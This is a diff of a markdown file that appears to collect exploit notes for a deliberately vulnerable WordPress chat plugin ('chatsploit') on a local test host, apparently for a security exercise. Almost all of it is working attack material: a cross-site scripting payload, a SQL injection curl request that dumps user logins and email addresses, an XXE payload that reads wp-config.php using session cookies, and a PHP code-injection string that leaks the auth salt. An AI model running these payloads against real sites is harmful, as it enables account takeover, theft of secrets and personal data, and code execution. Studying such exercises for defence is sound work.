@@ -1,6 +1,15 @@
+Make admin say something
+========================
+
+JS
+--
+
 ```js
 haX0R = true
 ```
+
+Submit
+------
 
 ```html
 <script>
@@ -12,6 +21,32 @@ haX0R = true
 </script>
 ```
 
+Get list of all users' email adresses
+=====================================
+
 ```bash
 curl -i 'http://hacek.local/wordpress/wp-admin/admin-ajax.php?action=chatsploit&since=2013-04-18+05:33:47%27+UNION+SELECT+user_login+AS+author%2C+user_email+AS+text%2C+0+AS+time+FROM+wp2_users+--+'
+```
+
+Get the site's SECRET_KEYs
+=========================
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE xxe [<!ENTITY hi SYSTEM "php://filter/read=convert.base64-encode/resource=file:///Users/mdawaffe/Sites/wp-config.php"> ]>
+<chat>&hi;</chat>
+```
+
+```bash
+cat xxe.xml | curl "http://hacek.local/wordpress/wp-admin/admin-ajax.php?action=chatsploit" -H "Cookie: wordpress_97bd8bf7ee22f9417a72a1ea2e1d6871=author%7C1366426304%7C8fad75c62a8b4bfac050244f094c1084; wordpress_logged_in_97bd8bf7ee22f9417a72a1ea2e1d6871=author%7C1366426304%7C4ae3cc62335b75ef19bb1f812050c654;" --data @-
+```
+
+Get the site's SECRET_SALTs (Code execution)
+============================================
+
+Submit
+------
+
+```
+hello http://example.com/{${substr(a.($a=get_option(auth_salt)),0,1)}} there
 ```
